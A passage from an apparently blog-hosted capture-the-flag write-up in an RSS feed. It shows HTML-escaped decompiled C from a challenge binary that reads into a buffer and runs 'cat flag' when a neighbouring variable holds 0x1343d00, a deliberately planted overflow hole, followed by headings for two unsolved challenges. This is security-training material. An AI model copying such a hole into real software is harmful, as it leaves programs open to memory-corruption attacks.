+  &lt;span class=&quot;token function&quot;&gt;FUN_00011090&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x12345678&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token function&quot;&gt;FUN_000110a0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_10c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x1343d00&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token function&quot;&gt;FUN_000110b0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;cat flag&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;FUN_000110a0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; unaff_EBX&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  
+                    &lt;span class=&quot;token comment&quot;&gt;/* WARNING: Could not recover jumptable at 0x000110a4. Too many branches */&lt;/span&gt;
+                    &lt;span class=&quot;token comment&quot;&gt;/* WARNING: Treating indirect jump as call */&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;code &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;unaff_EBX &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;h3&gt;Between 0&amp;#x26;1 (Unsolved)&lt;/h3&gt;
+&lt;h3&gt;WYSIWYG (Unsolved)&lt;/h3&gt;</content:encoded></item></channel></rss>
